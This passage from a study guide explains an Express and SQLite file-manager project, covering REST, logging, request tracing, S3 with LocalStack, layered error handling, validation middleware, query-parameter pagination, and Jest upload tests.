Resources are identified by URLs. HTTP verbs define the operation.
✅ Our URLs are noun-based: `/api/files`, `/api/files/:id`. HTTP verbs (GET/POST/PUT/DELETE) define what happens.

**5. Layered System:**
Clients don't need to know whether they're talking directly to the server or through proxies, CDNs, load balancers.
✅ Our middleware chain, routers, and controllers are independent layers.

**6. Code on Demand (optional):**
Server can send executable code (JavaScript) to clients.
✅ We serve JavaScript files from `public/js/` via Express static.

**Where our API is not 100% REST-strict:**
- `PUT /api/files/:id` — REST says PUT should be a full replacement (send all fields). Our PUT uses COALESCE for partial updates — this is technically PATCH behavior. For strict compliance, we should rename it `PATCH`.
- No `Link` headers for pagination or related resources.

---

## PART 10: Logging

---

### Q34: What is logging? What do we log in our project? What production logging looks like.

**Answer:**

**What is logging?**
Logging is recording significant events during your application's execution to a permanent record (console, files, external services).

**Why logging matters:**
- **Debugging:** When something breaks in production at 3 AM, logs tell you exactly what happened before the crash
- **Security monitoring:** Detect patterns of failed logins (someone brute-forcing)
- **Audit trail:** Know who uploaded what file and when
- **Performance:** Track slow requests, database query times
- **Compliance:** Some industries legally require audit logs

**Current logging in our project:**

```javascript
// config/db.js — startup log
console.log(`SQLite ready: ${dbPath}`);
// → SQLite ready: C:\Users\ASUS\OneDrive\Desktop\File_Manager\data\app.db

// server.js — startup log
console.log(`Application running on http://localhost:${PORT}`);
// → Application running on http://localhost:5000

// server.js — error logging (never shown to client)
if (status >= 500) console.error(err);
// → Logs full Error object including stack trace for developer debugging

// fileController.js — operational warnings
console.error(`Could not delete old file ${oldAbsolutePath}:`, err.message);
// → Could not delete old file C:\...\uploads\uuid.pdf: ENOENT: no such file
```

**What we're missing (HTTP request logging):**
Every HTTP request should be logged:
```
POST /api/auth/login 200 83ms - 145b
GET  /api/files 200 12ms - 892b
DELETE /api/files/5 404 5ms - 38b
```

This requires `morgan`:
```javascript
const morgan = require('morgan');
app.use(morgan('dev'));   // concise colored output for development
// or
app.use(morgan('combined')); // Apache Combined Log Format for production
```

**What to NEVER log:**
```javascript
// DANGEROUS — Never log these:
console.log('User password:', password);        // Plain text password in logs!
console.log('JWT token:', token);               // Stolen token = stolen session
console.log('Request body:', JSON.stringify(req.body)); // May contain passwords
console.log('DB connection string:', dbUrl);    // Credentials in logs
```

**What production logging looks like (using Winston):**
```javascript
const winston = require('winston');
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
    new winston.transports.Console({ level: 'debug' }),
  ],
});

logger.info('File uploaded', { userId: 1, filename: 'uuid.pdf', size: 52483 });
logger.error('Database error', { error: err.message, userId: 1 });
// Output: {"level":"info","message":"File uploaded","userId":1,"filename":"uuid.pdf","size":52483,"timestamp":"2026-11-24T00:00:00.000Z"}
```

Structured JSON logs can be shipped to monitoring services like Datadog, Splunk, or CloudWatch for search, alerting, and dashboards.

---

## PART 11: Request Journey (Complete Trace)

---

### Q35: Trace a DELETE request from click to response, every single step.

**Answer:**

Request: `DELETE /api/files/5` by User praphool (ID=1). File 5 belongs to praphool.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BROWSER (dashboard.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
User clicks "Delete" button on file #5.

Confirm dialog: "Are you sure you want to delete this file?"
User clicks "Delete Permanently".

JavaScript executes:
  fetch('/api/files/5', {
    method: 'DELETE',
    headers: { Authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MX0.X9bJ' }
  })

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NETWORK LAYER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Browser opens TCP connection to 127.0.0.1:5000

Raw HTTP bytes sent:
  DELETE /api/files/5 HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer eyJhbGci...
  Connection: keep-alive

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NODE.JS EVENT LOOP (server.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
libuv detects data on socket
Event Loop picks up the incoming request event
Passes raw bytes to Node's HTTP parser
HTTP parser assembles:
  req.method = "DELETE"
  req.url = "/api/files/5"
  req.headers.authorization = "Bearer eyJhbGci..."
Passes to Express

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EXPRESS MIDDLEWARE CHAIN (server.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. express.static('/public')
   → /api/files/5 is not a static file → calls next()

2. express.json()
   → DELETE has no body, nothing to parse → calls next()

3. app.use('/', viewRoutes)
   → /api/files/5 doesn't match /login, /register, /dashboard → calls next()

4. app.use('/api/auth', authRoutes)
   → /api/files/5 doesn't match /api/auth/* → calls next()

5. app.use('/api/files', fileRoutes)
   → /api/files/5 MATCHES! → enters fileRoutes.js

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FILE ROUTES (routes/fileRoutes.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
router.use(authMiddleware) → runs for ALL routes in this router

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AUTH MIDDLEWARE (middleware/authMiddleware.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
header = "Bearer eyJhbGci..."
header.startsWith('Bearer ') → true ✅

token = "eyJhbGci..." (after slicing "Bearer ")
token is not empty ✅

jwt.verify("eyJhbGci...", JWT_SECRET, { algorithms: ['HS256'] })
→ Decodes header: alg=HS256 ✅
→ Decodes payload: { id: 1, exp: 1700086400 }
→ Current time (1700000000) < exp (1700086400) → NOT expired ✅
→ Recomputes signature using JWT_SECRET
→ Computed signature MATCHES token signature ✅
→ Returns decoded = { id: 1, ... }

req.user = { id: 1 }  ← user ID injected into request
next() called

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BACK IN FILE ROUTES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
router.delete('/:id', deleteFile)
→ /5 matches /:id → req.params.id = "5"
→ No upload middleware for DELETE (no Multer needed)
→ Calls deleteFile controller

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DELETE FILE CONTROLLER (controllers/fileController.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
parseId("5") → /^\d+$/.test("5") = true → returns 5

File.findByIdAndUser(5, 1)
→ SQL: SELECT * FROM files WHERE id = 5 AND uploaded_by = 1
→ SQLite returns: {
    id: 5,
    original_name: "Invoice_Q4.pdf",
    display_name: "My Invoice",
    stored_name: "3f8a1c2d-4e5b-6f7a-8b9c-0d1e2f3a4b5c.pdf",
    path: "uploads/3f8a1c2d-4e5b-6f7a-8b9c-0d1e2f3a4b5c.pdf",
    uploaded_by: 1
  }
file is defined ✅ (not 404)

File.deleteByIdAndUser(5, 1)
→ SQL: DELETE FROM files WHERE id = 5 AND uploaded_by = 1
→ result.changes = 1 (one row deleted)
→ deleted = true ✅

resolveStoredPath("uploads/3f8a1c2d....pdf")
→ path.resolve(ROOT_DIR, "uploads/3f8a1c2d....pdf")
→ "C:\Users\ASUS\...\File_Manager\uploads\3f8a1c2d....pdf"
→ starts with UPLOAD_DIR + "\" → safe ✅
→ returns absolute path

fs.promises.unlink("C:\...\uploads\3f8a1c2d....pdf")
→ OS removes the file from disk
→ await resolves successfully

res.json({ message: 'File deleted' })

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RESPONSE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Express serializes: { message: "File deleted" }
Sets headers:
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8
  Content-Length: 24

Sends back over TCP to browser

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BACK IN BROWSER (dashboard.js)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
fetch() promise resolves with response object
res.ok === true (200 is OK)
JavaScript removes the file row from the HTML table
UI shows "File deleted successfully"
```

**What if the token was expired?**
```
authMiddleware: jwt.verify throws TokenExpiredError
catch block: message = "Token expired, please log in again"
return res.status(401).json({ message: "Token expired, please log in again" })
→ STOPS HERE. deleteFile controller NEVER runs.
→ Database: untouched. File: untouched.
Browser receives 401 → dashboard.js detects 401 → clears localStorage → redirects to /login
```

---

## PART 12: AWS S3 & LocalStack

---

### Q36: What is AWS S3? What is LocalStack? How would you use them in this project?

**Answer:**

**Current storage approach:**
Files are saved to `uploads/` on the same machine that runs Node.js.

**Problem with local disk storage in production:**
- **Single point of failure:** If this machine's disk fails, all files are gone
- **Not scalable:** If you deploy 3 Node.js servers behind a load balancer, User A uploads to Server 1's disk, but when their next request goes to Server 2, the file doesn't exist there
- **Backup complexity:** You must back up server disk manually
- **Limited capacity:** Server disks fill up

**AWS S3 (Simple Storage Service):**
Amazon's cloud object storage. Instead of a file system, you store "objects" (files + metadata) in "buckets" (containers). Files live in Amazon's distributed data centers — replicated across multiple physical locations automatically.

**Key S3 concepts:**
- **Bucket:** Like a folder. `my-filemanager-uploads`
- **Object:** A stored file + its metadata. Identified by a **Key** (like a filename): `uploads/uuid.pdf`
- **Pre-signed URL:** A temporary, time-limited URL for secure access without exposing credentials

**LocalStack:**
LocalStack is a Docker container that **emulates AWS services locally**:
```bash
docker run --rm -p 4566:4566 localstack/localstack
# → Fake S3 running at http://localhost:4566
# → Free, no AWS account, no internet, no costs
```

You point your AWS SDK to `http://localhost:4566` instead of real AWS:
```javascript
const s3 = new S3Client({
  region: 'us-east-1',
  endpoint: 'http://localhost:4566',  // LocalStack
  credentials: { accessKeyId: 'test', secretAccessKey: 'test' },
  forcePathStyle: true,  // Required for LocalStack
});
```

**How the upload flow would change:**

**Current (local disk):**
```
Request → Multer → save to disk → store path in DB → 201
```

**With S3:**
```
Request → Multer (memoryStorage) → upload buffer to S3 → store S3 key in DB → 201
```

```javascript
// 1. Use memory storage — Multer keeps file in RAM buffer, not disk
const storage = multer.memoryStorage();

// 2. In uploadFile controller:
const uploadFile = async (req, res) => {
  const key = `${crypto.randomUUID()}${ALLOWED_TYPES[req.file.mimetype]}`;

  await s3.send(new PutObjectCommand({
    Bucket: 'my-filemanager-uploads',
    Key: key,                           // e.g., "uuid.pdf"
    Body: req.file.buffer,              // entire file in memory buffer
    ContentType: req.file.mimetype,     // "application/pdf"
  }));

  const saved = File.create({
    stored_name: key,
    path: `s3://my-filemanager-uploads/${key}`, // S3 URI stored in DB
    // ... other fields
  });
  res.status(201).json(toPublic(saved));
};
```

**How download changes — Pre-signed URLs:**
```javascript
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const downloadFile = async (req, res) => {
  // ...get file from DB...
  
  const command = new GetObjectCommand({
    Bucket: 'my-filemanager-uploads',
    Key: file.stored_name,
  });
  
  // Generate a temporary URL valid for 5 minutes
  const url = await getSignedUrl(s3, command, { expiresIn: 300 });
  
  // Client redirects to this URL — downloads directly from S3
  res.json({ download_url: url });
  // After 5 minutes, the URL expires and can't be used again
};
```

**What is a Pre-signed URL?**
A regular S3 URL is either:
- Fully public (anyone can access)
- Fully private (need AWS credentials)

A pre-signed URL is a clever middle ground: it embeds your credentials and an expiry time INTO the URL itself, cryptographically signed. When you share it, anyone with the URL can download that specific file — but only for the duration specified (in our case, 5 minutes).

This is how Netflix, Dropbox, and Google Drive generate download links.

---

## PART 13: Error Handling (Complete Deep Dive)

---

### Q37: Explain all 6 layers of error handling in your project.

**Answer:**

**Layer 1 — Input Validation (400 errors, before touching the database)**

This is the first line of defense. We validate inputs BEFORE doing any expensive or state-changing operations.

In `authController.js`:
```javascript
const validateCredentials = (username, password) => {
  if (typeof username !== 'string' || typeof password !== 'string') {
    return 'Username and password are required';
  }
  if (username.trim().length < 3 || username.trim().length > 30) {
    return 'Username must be 3-30 characters';
  }
  if (password.length < 6 || password.length > 72) {
    return 'Password must be 6-72 characters';
  }
  return null; // null = valid!
};

const register = async (req, res) => {
  const error = validateCredentials(username, password);
  if (error) return res.status(400).json({ message: error }); // ← stops here
  // Only reaches database if validation passes
};
```

**Why this is first:** No point doing a database query or bcrypt hash (expensive!) if the input is obviously wrong.

**Layer 2 — Authentication Middleware (401 errors)**

```javascript
// authMiddleware.js
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  req.user = { id: decoded.id };
  next();
} catch (err) {
  const message = err.name === 'TokenExpiredError'
    ? 'Token expired, please log in again'
    : 'Invalid token';
  return res.status(401).json({ message }); // ← stops entire chain
}
```

If this returns a response, all downstream middleware and controllers are SKIPPED.

**Layer 3 — Business Logic Errors (404, 409 errors)**

Expected failures that we handle specifically:

```javascript
// 404 — resource doesn't exist or doesn't belong to user
const file = File.findByIdAndUser(id, req.user.id);
if (!file) return res.status(404).json({ message: 'File not found' });

// 409 — conflict: username already taken
if (User.findByUsername(cleanUsername)) {
  return res.status(409).json({ message: 'Username already taken' });
}

// 400 — no update data provided
if (Object.keys(updateData).length === 0) {
  return res.status(400).json({ message: 'No update data provided' });
}
```

**Layer 4 — Multer Errors (400, 413, via central handler)**

Multer internally calls `next(err)` on failure, which skips all normal middleware and goes to the error handler:

```javascript
// server.js central error handler:
if (err instanceof multer.MulterError) {
  const tooLarge = err.code === 'LIMIT_FILE_SIZE';
  return res.status(tooLarge ? 413 : 400).json({
    message: tooLarge
      ? 'File is too large'
      : `Upload error: ${err.message}`
  });
}
```

| Multer error code | Meaning | HTTP status |
|---|---|---|
| `LIMIT_FILE_SIZE` | File exceeds 5MB | 413 Payload Too Large |
| `LIMIT_FILE_COUNT` | More than 1 file sent | 400 Bad Request |
| `LIMIT_UNEXPECTED_FILE` | Wrong field name | 400 Bad Request |

**Layer 5 — Central 500 Error Handler**

Catches everything else — programming bugs, unhandled database errors:

```javascript
app.use((err, req, res, next) => {
  const status = err.status || 500;
  if (status >= 500) console.error(err); // full stack trace to server console
  res.status(status).json({
    message: status >= 500
      ? 'Server error'   // hide internals from client
      : err.message      // safe for 4xx
  });
});
```

**Layer 6 — Orphan File Cleanup (within try/catch)**

```javascript
try {
  const saved = File.create({...});
} catch (err) {
  await fs.promises.unlink(req.file.path).catch(() => {}); // cleanup disk
  throw err; // re-throw to Layer 5 → sends 500 to client
}
```

**Why `throw err` after the cleanup?**
We WANT the error to continue propagating to Layer 5. The `throw` re-throws the original database error. Layer 5 catches it and sends `500 Server Error` to the client. Without `throw err`, the function would just end silently and the client would never get a response — their request would hang forever.

---

### Q38: What is the difference between `throw err` and `return res.status(400).json()`?

**Answer:**

These are two completely different error handling strategies:

**`return res.status(400).json({ message: "..." })`**
- **Who handles sending the response:** THIS function. Right here, right now.
- **Used for:** Errors you EXPECT and can handle specifically (bad input, file not found, duplicate username).
- **Flow:** Response sent → function returns → request complete.
- **Example:**
  ```javascript
  if (!file) {
    return res.status(404).json({ message: 'File not found' });
    // Execution stops here. Central error handler is never involved.
  }
  ```

**`throw err`** (or `next(err)` in Express 4)
- **Who handles sending the response:** The CENTRAL ERROR MIDDLEWARE in `server.js`.
- **Used for:** Unexpected errors you DON'T know how to handle specifically (database crash, programming bug).
- **Flow:** Error propagates up → skips remaining normal middleware → central handler catches it → sends generic 500.
- **Example:**
  ```javascript
  try {
    File.create({...}); // might throw if DB crashes
  } catch (err) {
    await fs.promises.unlink(req.file.path).catch(() => {});
    throw err;
    // This error goes to server.js error handler which sends 500
  }
  ```

**Decision rule:**
```
Do I know what went wrong and can I give a meaningful message?
  YES → res.status(xxx).json({ message: "specific message" })
  NO  → throw err (let the central handler deal with it)
```

---


---

## PART 14: Dedicated Validation Middleware & Request Sanitization

---

### Q39: The mentor asked for "basic validation (by using middleware)". How do you build reusable validation middleware in Express using `(req, res, next)`? Why is middleware validation better than validating inside the controller?

**Answer:**

**The Beginner Problem:**
When you first learn Express, it is tempting to put validation inside the controller function:
```javascript
// authController.js (controller does validation + business logic)
const register = async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || username.length < 3) {
    return res.status(400).json({ message: 'Invalid username' });
  }
  // ... hash password, insert to DB, generate token
};
```

**Why this violates professional MVC design:**
1. **Controller has too many jobs:** A controller's job is **business orchestration** (hashing, database calls, tokens). Checking string lengths and types is **request validation**.
2. **Code duplication (violates DRY):** If you have three routes that accept a username (register, update profile, search user), you would have to duplicate the validation code in three controllers.
3. **Fail-Fast principle:** Bad data should be rejected at the **boundary** (middleware) before it ever touches your core application logic or allocates memory for controllers.

**How Validation Middleware Works:**
In Express, middleware is any function with the signature `(req, res, next)`:
- If the data is **valid**, it calls `next()` to pass control to the controller.
- If the data is **invalid**, it immediately returns `res.status(400).json({ ... })` and the controller **NEVER runs**.

**Step-by-Step Implementation of `middleware/validationMiddleware.js`:**

```javascript
// middleware/validationMiddleware.js

/**
 * Validates user registration data (username & password)
 * Sanitizes input (trims whitespace) before passing to controller
 */
const validateRegister = (req, res, next) => {
  const { username, password } = req.body || {};

  // 1. Check data types (prevent objects, arrays, or null being passed)
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ message: 'Username and password are required strings' });
  }

  // 2. Trim and check username length
  const cleanUsername = username.trim();
  if (cleanUsername.length < 3 || cleanUsername.length > 30) {
    return res.status(400).json({ message: 'Username must be between 3 and 30 characters' });
  }

  // 3. Username character whitelist (letters, numbers, underscores only)
  if (!/^[a-zA-Z0-9_]+$/.test(cleanUsername)) {
    return res.status(400).json({ message: 'Username can only contain letters, numbers, and underscores' });
  }

  // 4. Password length (min 6 chars, max 72 chars due to bcrypt limit)
  if (password.length < 6 || password.length > 72) {
    return res.status(400).json({ message: 'Password must be between 6 and 72 characters' });
  }

  // 5. Sanitization: attach the cleaned username to req.body
  req.body.username = cleanUsername;

  // 6. Validation passed! Pass execution to the next handler/controller
  next();
};

/**
 * Validates login request fields
 */
const validateLogin = (req, res, next) => {
  const { username, password } = req.body || {};

  if (typeof username !== 'string' || typeof password !== 'string' || !username.trim() || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  req.body.username = username.trim();
  next();
};

module.exports = { validateRegister, validateLogin };
```

**How to Wire it Up in Routes (`routes/authRoutes.js`):**

```javascript
// routes/authRoutes.js
const express = require('express');
const { register, login } = require('../controllers/authController');
const { validateRegister, validateLogin } = require('../middleware/validationMiddleware');
const rateLimit = require('express-rate-limit');

const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
const router = express.Router();

// Middleware pipeline: [validateRegister] runs BEFORE [register]
router.post('/register', validateRegister, register);

// Middleware pipeline: [authLimiter] -> [validateLogin] -> [login]
router.post('/login', authLimiter, validateLogin, login);

module.exports = router;
```

**Notice what happened to `authController.js`:**
Now `authController.register` is 100% clean! It doesn't need `validateCredentials()` anymore because it knows that by the time the request reaches the controller, the data is already guaranteed to be a valid, clean string.

---

### Q40: How would you validate file uploads and route parameters using middleware?

**Answer:**

**Validating Route Parameters (`:id`):**
When a client requests `GET /api/files/:id/download` or `DELETE /api/files/:id`, the `:id` comes in as a string from the URL.

If someone sends `GET /api/files/abc/download` or `GET /api/files/-5/download`, we shouldn't even query the database. We can catch this with parameter validation middleware:

```javascript
// middleware/fileValidation.js

/**
 * Validates that :id in the URL is a positive integer
 */
const validateFileId = (req, res, next) => {
  const idStr = req.params.id;

  // Regex: one or more digits from start to end
  if (!idStr || !/^\d+$/.test(idStr)) {
    return res.status(400).json({ message: 'File ID must be a valid positive number' });
  }

  const idNum = Number(idStr);
  if (idNum <= 0 || !Number.isSafeInteger(idNum)) {
    return res.status(400).json({ message: 'Invalid file ID range' });
  }

  // Attach the parsed number directly to the request object
  req.fileId = idNum;
  next();
};

module.exports = { validateFileId };
```

**Mounting it on `routes/fileRoutes.js`:**
```javascript
router.get('/:id/download', validateFileId, downloadFile);
router.delete('/:id', validateFileId, deleteFile);
```

**Inside `fileController.js`:**
```javascript
const downloadFile = async (req, res) => {
  // req.fileId is ALREADY validated as a safe integer by the middleware!
  const file = File.findByIdAndUser(req.fileId, req.user.id);
  if (!file) return res.status(404).json({ message: 'File not found' });
  // ... send file
};
```

---

## PART 15: Query Parameters & Search, Pagination, and Filtering

---

### Q41: The mentor specifically asked: "query params used like get, put, etc." Explain query parameters in detail. Can PUT or DELETE use query params? How do you implement search, filtering, and pagination in `GET /api/files`?

**Answer:**

**What is a Query Parameter?**
A query parameter is key-value data appended to the end of a URL after a question mark (`?`), with pairs separated by ampersands (`&`):
```
GET /api/files?page=2&limit=5&search=tax&mime=application/pdf&sort=size&order=desc
              ^      ^        ^          ^                    ^         ^
           start    key=val  key=val    key=val              key=val   key=val
```

In Express, query parameters are automatically parsed and made available on **`req.query`**:
```javascript
console.log(req.query);
// Output:
// {
//   page: '2',
//   limit: '5',
//   search: 'tax',
//   mime: 'application/pdf',
//   sort: 'size',
//   order: 'desc'
// }
```

---

### Can `PUT` or `DELETE` use Query Parameters?

**YES, technically HTTP allows query parameters on ANY method.**

Here is how each HTTP method uses query parameters in real-world systems:

| HTTP Method | Common Use of Query Parameters | Example URL | Why / Best Practice |
|---|---|---|---|
| **GET** | Filtering, searching, sorting, pagination | `GET /api/files?page=1&limit=10&search=report` | **Standard REST practice.** Safe and idempotent. Bookmarkable and cacheable. |
| **DELETE** | Soft-delete vs hard-delete, or bulk operations | `DELETE /api/files/15?permanent=true` or `DELETE /api/files?all=true` | Allowed. The query parameter acts as an execution flag or filter. |
| **PUT** | Conditional updates or overwrite flags | `PUT /api/files/15?overwrite=true` | Allowed, but modified entity data belongs in the **Request Body**, NOT query params. |
| **POST** | Webhook flags, dry-run simulation | `POST /api/files?dryRun=true` | Allowed. Query param controls server behavior, body carries payload. |

> **Mentor Tip:**
> If your mentor asks: *"Can a PUT request have query parameters?"*
> Answer: *"Yes! While the entity's updated data should be sent in the request body, query parameters can be used in PUT requests for operational modifiers or options, such as `PUT /api/files/10?mode=replace` or `?notify=false`."*

---

### How to Implement Search, Filtering, and Pagination in `GET /api/files`

Here is how you upgrade `listFiles` in our project to support query parameters:

**Step 1: The Controller (`controllers/fileController.js`):**
```javascript
// GET /api/files?search=report&mime=application/pdf&page=1&limit=10&sort=size&order=asc
const listFiles = async (req, res) => {
  const userId = req.user.id;

  // Extract query parameters with safe defaults
  const search = req.query.search ? String(req.query.search).trim() : null;
  const mime = req.query.mime ? String(req.query.mime).trim() : null;
  const page = Math.max(1, parseInt(req.query.page, 10) || 1);
  const limit = Math.min(50, Math.max(1, parseInt(req.query.limit, 10) || 10)); // max 50 items
  const offset = (page - 1) * limit;

  // Whitelist sorting columns to prevent SQL injection in ORDER BY
  const allowedSortCols = {
    date: 'uploaded_at',
    name: 'original_name',
    size: 'size',
  };
  const sortCol = allowedSortCols[req.query.sort] || 'uploaded_at';
  const sortOrder = req.query.order?.toLowerCase() === 'asc' ? 'ASC' : 'DESC';

  // Call Model with query parameters
  const { files, totalCount } = File.findWithFilters({
    userId,
    search,
    mime,
    limit,
    offset,
    sortCol,
    sortOrder,
  });

  res.json({
    data: files.map(toPublic),
    pagination: {
      page,
      limit,
      totalCount,
      totalPages: Math.ceil(totalCount / limit),
      hasNextPage: page * limit < totalCount,
      hasPrevPage: page > 1,
    },
  });
};
```

**Step 2: The Model (`models/file.js`):**
```javascript
findWithFilters({ userId, search, mime, limit, offset, sortCol, sortOrder }) {
  let whereClauses = ['uploaded_by = ?'];
  let params = [userId];

  // Optional search filter
  if (search) {
    whereClauses.push('(original_name LIKE ? OR display_name LIKE ?)');
    params.push(`%${search}%`, `%${search}%`);
  }

  // Optional MIME type filter
  if (mime) {
    whereClauses.push('mime_type = ?');
    params.push(mime);
  }

  const whereSql = whereClauses.join(' AND ');

  // 1. Get total matching count for pagination math
  const countStmt = db.prepare(`SELECT COUNT(*) as count FROM files WHERE ${whereSql}`);
  const totalCount = countStmt.get(...params).count;

  // 2. Query page slice
  // Note: sortCol and sortOrder were already whitelisted against a strict map!
  const querySql = `
    SELECT * FROM files
    WHERE ${whereSql}
    ORDER BY ${sortCol} ${sortOrder}
    LIMIT ? OFFSET ?
  `;
  const files = db.prepare(querySql).all(...params, limit, offset);

  return { files, totalCount };
}
```

**Why this answers the mentor's requirement:**
- It proves you know how to read `req.query`.
- It demonstrates pagination math: `offset = (page - 1) * limit`.
- It shows how to prevent SQL injection in `ORDER BY` (column names cannot use `?` placeholders, so you must use a whitelist dictionary).

---

## PART 16: Testing File Upload & Management with Jest & Supertest

---

### Q42: The mentor asked to "Write test cases for atleast one API using JEST". We tested auth APIs. How do you test file upload, download, and delete in Jest and Supertest with binary files and multipart form data?

**Answer:**

**The Testing Challenge:**
File upload routes don't accept JSON (`application/json`). They accept **`multipart/form-data`** containing binary file streams!
Supertest has a special method called **`.attach(fieldName, filePathOrBuffer)`** specifically designed to simulate file uploads.

**Step-by-Step File Integration Test (`tests/files.test.js`):**

```javascript
// tests/files.test.js
const request = require('supertest');
const path = require('path');
const fs = require('fs');
const app = require('../server');
const { db } = require('../config/db');

describe('File Management API Integration Tests', () => {
  let userToken;
  let testUserId;
  let uploadedFileId;
  const dummyFilePath = path.join(__dirname, 'test-sample.txt');

  // Before running tests: create a test file on disk and register a test user
  beforeAll(async () => {
    // 1. Create a physical dummy file to upload
    fs.writeFileSync(dummyFilePath, 'This is a test file for Jest automation');

    // 2. Register a unique test user to obtain a valid JWT token
    const res = await request(app)
      .post('/api/auth/register')
      .send({ username: 'file_tester_' + Date.now(), password: 'password123' });

    userToken = res.body.token;
    testUserId = res.body.user.id;
  });

  // After all tests: delete physical files and test data
  afterAll(async () => {
    if (fs.existsSync(dummyFilePath)) fs.unlinkSync(dummyFilePath);

    // Clean up any files uploaded during the test
    const files = db.prepare('SELECT stored_name FROM files WHERE uploaded_by = ?').all(testUserId);
    for (const f of files) {
      const p = path.join(__dirname, '..', 'uploads', f.stored_name);
      if (fs.existsSync(p)) fs.unlinkSync(p);
    }
    db.prepare('DELETE FROM files WHERE uploaded_by = ?').run(testUserId);
    db.prepare('DELETE FROM users WHERE id = ?').run(testUserId);
  });

  // -------------------------------------------------------------
  // TEST 1: POST /api/files - Unauthenticated
  // -------------------------------------------------------------
  test('POST /api/files should reject upload without Authorization header (401)', async () => {
    const res = await request(app)
      .post('/api/files')
      .attach('file', dummyFilePath);

    expect(res.status).toBe(401);
    expect(res.body.message).toBe('Authentication required');
  });

  // -------------------------------------------------------------
  // TEST 2: POST /api/files - Valid upload
  // -------------------------------------------------------------
  test('POST /api/files should successfully upload a file with valid JWT (201)', async () => {
    const res = await request(app)
      .post('/api/files')
      .set('Authorization', `Bearer ${userToken}`)
      .attach('file', dummyFilePath)
      .field('display_name', 'My Jest Test Document');

    expect(res.status).toBe(201);
    expect(res.body).toHaveProperty('id');
    expect(res.body.original_name).toBe('test-sample.txt');
    expect(res.body.display_name).toBe('My Jest Test Document');
    expect(res.body.mime_type).toBe('text/plain');

    uploadedFileId = res.body.id; // save for download & delete tests
  });

  // -------------------------------------------------------------
  // TEST 3: POST /api/files - Disallowed file extension
  // -------------------------------------------------------------
  test('POST /api/files should reject disallowed file types like .exe (400)', async () => {
    const exePath = path.join(__dirname, 'danger.exe');
    fs.writeFileSync(exePath, 'MZ fake executable binary');

    const res = await request(app)
      .post('/api/files')
      .set('Authorization', `Bearer ${userToken}`)
      .attach('file', exePath);

    fs.unlinkSync(exePath); // clean up

    expect(res.status).toBe(400);
    expect(res.body.message).toMatch(/not allowed/i);
  });

  // -------------------------------------------------------------
  // TEST 4: GET /api/files - List files
  // -------------------------------------------------------------
  test('GET /api/files should list files belonging to the authenticated user (200)', async () => {
    const res = await request(app)
      .get('/api/files')
      .set('Authorization', `Bearer ${userToken}`);

    expect(res.status).toBe(200);
    expect(Array.isArray(res.body)).toBe(true);
    expect(res.body.length).toBeGreaterThanOrEqual(1);
    expect(res.body.some((f) => f.id === uploadedFileId)).toBe(true);
  });

  // -------------------------------------------------------------
  // TEST 5: GET /api/files/:id/download - Download file
  // -------------------------------------------------------------
  test('GET /api/files/:id/download should download file with Content-Disposition (200)', async () => {
    const res = await request(app)
      .get(`/api/files/${uploadedFileId}/download`)
      .set('Authorization', `Bearer ${userToken}`);

    expect(res.status).toBe(200);
    expect(res.headers['content-disposition']).toMatch(/attachment; filename=/);
    expect(res.text).toBe('This is a test file for Jest automation');
  });

  // -------------------------------------------------------------
  // TEST 6: DELETE /api/files/:id - Delete file
  // -------------------------------------------------------------
  test('DELETE /api/files/:id should delete file from DB and disk (200)', async () => {
    const res = await request(app)
      .delete(`/api/files/${uploadedFileId}`)
      .set('Authorization', `Bearer ${userToken}`);

    expect(res.status).toBe(200);
